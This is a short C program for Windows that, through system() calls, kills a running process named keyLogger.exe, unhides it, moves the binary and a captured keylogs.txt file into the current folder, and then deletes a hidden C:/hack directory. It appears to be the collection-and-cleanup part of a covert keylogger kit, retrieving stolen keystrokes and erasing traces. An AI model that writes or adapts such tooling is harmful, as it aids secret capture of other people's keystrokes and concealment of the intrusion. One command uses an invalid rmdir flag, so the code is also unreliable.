#include <Windows.h>

int main()
{
	system("taskkill /f /im keyLogger.exe");
	system("C: && cd C:/hack && attrib -s -h keyLogger.exe && move keyLogger.exe %cd%");
	system("C: && cd C:/hack && move keylogs.txt %cd%");
	system("C: && attrib -h hack && rmdir /s /y hack");
	return 0;
}